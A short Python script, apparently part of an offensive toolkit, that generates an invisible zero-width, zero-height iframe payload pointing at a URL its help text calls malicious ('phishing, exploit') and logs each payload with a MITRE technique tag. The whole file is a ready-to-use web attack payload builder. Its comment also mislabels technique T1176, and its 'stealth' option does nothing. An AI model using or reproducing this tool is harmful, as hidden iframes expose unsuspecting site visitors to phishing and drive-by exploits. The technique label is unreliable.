# modules/exploits/iframe_payload_injector.py

import argparse
import os
import json
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
PAYLOAD_OUT = "results/web/iframe_payload.html"
MITRE_TTP = "T1176"  # Browser Exploitation via Malicious iframe

def log_event(entry):
    os.makedirs("results/web", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            existing = json.load(f)
    else:
        existing = []
    existing.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(existing, f, indent=2)

def build_iframe(target_url, width="0", height="0", stealth=True):
    payload = f'<iframe src="{target_url}" width="{width}" height="{height}" style="border:none;"></iframe>'
    with open(PAYLOAD_OUT, "w") as f:
        f.write(payload)

    log_event({
        "timestamp": datetime.utcnow().isoformat(),
        "type": "iframe_payload",
        "target_url": target_url,
        "payload_file": PAYLOAD_OUT,
        "dimensions": f"{width}x{height}",
        "stealth": stealth,
        "ttp": MITRE_TTP
    })

    print(f"[âœ“] iframe payload written to {PAYLOAD_OUT}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="iframe Payload Injector")
    parser.add_argument("--url", required=True, help="Malicious iframe URL (e.g. phishing, exploit)")
    parser.add_argument("--width", default="0")
    parser.add_argument("--height", default="0")
    parser.add_argument("--stealth", action="store_true")
    args = parser.parse_args()

    build_iframe(args.url, args.width, args.height, args.stealth)
